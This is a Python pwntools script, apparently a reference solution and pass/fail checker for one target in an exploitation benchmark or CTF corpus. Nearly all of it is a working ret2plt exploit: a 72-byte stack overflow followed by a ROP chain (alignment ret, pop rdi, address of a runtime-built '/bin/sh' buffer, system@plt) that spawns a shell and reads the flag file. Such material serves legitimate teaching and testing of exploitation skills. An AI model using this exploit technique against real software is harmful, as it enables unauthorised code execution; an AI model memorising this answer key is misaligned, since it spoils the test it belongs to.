#!/usr/bin/env python3
"""
Hand-verified standalone pwntools reference exploit for corpus_r2 target
02_ret2plt_strcat_system.

Technique: ret2plt system("/bin/sh"), no leak needed. "/bin/sh" is built at
runtime by build_string() (strcpy("/bin") + strcat("/sh")) into the
fixed-address global `sh_buf` -- no literal "/bin/sh" string needs to be
found in the binary. A harmless, correctly-bounded decoy read (greet())
happens before the real vulnerable one (vuln()'s `cmd` buffer).

Offset to the saved return address (cyclic pattern + corefile): 72 bytes
(cmd[64] + 8-byte saved rbp).

Chain: a bare `ret` gadget first (glibc's do_system() executes a
`movaps [rsp], xmm1`, which SIGSEGVs unless rsp is 16-byte aligned at the
call -- the same stack-parity nuance documented in round 1), then
`pop rdi; ret` loading &sh_buf, then system@plt.

Run directly:
    python3 02_ret2plt_strcat_system_reference.py
"""
import os
import sys

from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
TARGET_DIR = os.path.join(HERE, "..", "corpus_r2", "02_ret2plt_strcat_system")
BINARY = os.path.join(TARGET_DIR, "ret2plt_strcat_system")
FLAG_FILE = os.path.join(TARGET_DIR, "flag.txt")

context.arch = "amd64"
context.log_level = "error"

OFFSET_TO_RETADDR = 72


def exploit():
    elf = ELF(BINARY, checksec=False)
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    bare_ret = rop.find_gadget(["ret"])[0]

    io = process(elf.path, cwd=TARGET_DIR)
    io.recvuntil(b"name: ")
    io.sendline(b"hi")
    io.recvuntil(b"cmd> ")

    payload = b"A" * OFFSET_TO_RETADDR
    payload += p64(bare_ret)                  # 16-byte stack-alignment fixer
    payload += p64(pop_rdi)
    payload += p64(elf.symbols["sh_buf"])
    payload += p64(elf.plt["system"])
    io.send(payload)

    io.sendline(b"cat flag.txt")
    return io


def main():
    with open(FLAG_FILE) as f:
        expected_flag = f.read().strip()

    io = exploit()
    output = io.recvrepeat(timeout=3)
    io.close()

    ok = expected_flag.encode() in output
    print(f"[{'PASS' if ok else 'FAIL'}] 02_ret2plt_strcat_system: "
          f"expected flag {'found' if ok else 'NOT found'} in output")
    if not ok:
        print("---- captured output ----")
        print(output)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
